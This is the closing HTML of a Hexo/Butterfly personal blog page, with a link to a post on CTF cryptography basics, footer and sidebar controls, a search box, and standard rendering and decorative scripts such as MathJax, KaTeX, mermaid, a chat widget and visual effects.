class="content"><a class="title" href="/2023/01/26/ctf-crypto-1/" title="CTF系列-Cryptography密碼學基礎">CTF系列-Cryptography密碼學基礎</a><time datetime="2023-01-26T14:58:44.000Z" title="Created 2023-01-26 22:58:44">2023-01-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Albert Huang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', '', 'katex-wrap')
  })
})()</script><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      false && mermaid.init()
    })
  }
}</script></div><script src="//code.tidio.co/qqpjqsklrzstouh4l6ias23ukyxcbm3p.js" async></script><script src="/js/exten.js"></script><link rel="stylesheet" href="/css/exten.css"><script src="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script src="//code.tidio.co/qqpjqsklrzstouh4l6ias23ukyxcbm3p.js" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>